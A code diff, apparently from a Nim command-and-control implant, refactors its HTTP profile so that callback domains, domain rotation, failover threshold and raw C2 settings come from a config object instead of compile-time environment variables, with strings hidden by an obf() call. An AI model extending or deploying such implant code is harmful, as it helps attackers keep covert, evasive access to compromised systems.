@@ -28,7 +28,7 @@ proc newHttpxProfile*(): HttpxProfile =
   result.currentDomainIndex = 0
   
   # Parse callback_domains from JSON array
-  let domainsStr = static: getEnv(obf("CALLBACK_DOMAINS"))
+  let domainsStr = result.config.callbackDomains
   if domainsStr.len == 0:
     raise newException(ValueError, obf("CALLBACK_DOMAINS environment variable is not set"))
   try:
@@ -40,22 +40,18 @@ proc newHttpxProfile*(): HttpxProfile =
     raise newException(ValueError, obf("Failed to parse CALLBACK_DOMAINS"))
 
   # Get domain rotation strategy
-  let domainRotationStr = static: getEnv(obf("DOMAIN_ROTATION"))
+  let domainRotationStr = result.config.domainRotation
   if domainRotationStr.len == 0:
     raise newException(ValueError, obf("DOMAIN_ROTATION environment variable is not set"))
   result.domainRotation = domainRotationStr
 
   # Get failover threshold
-  let thresholdStr = static: getEnv(obf("FAILOVER_THRESHOLD"))
-  if thresholdStr.len == 0:
-    raise newException(ValueError, obf("FAILOVER_THRESHOLD environment variable is not set"))
-  try:
-    result.failoverThreshold = parseInt(thresholdStr)
-  except:
-    raise newException(ValueError, obf("FAILOVER_THRESHOLD is not a valid integer"))
+  result.failoverThreshold = result.config.failoverThreshold
+  if result.failoverThreshold == 0:
+    raise newException(ValueError, obf("FAILOVER_THRESHOLD is not set or invalid"))
   
   # Parse raw_c2_config
-  let rawConfigStr = static: getEnv(obf("RAW_C2_CONFIG"), "")
+  let rawConfigStr = result.config.rawC2Config
   if rawConfigStr.len > 0:
     try:
       result.rawC2Config = parseJson(rawConfigStr)
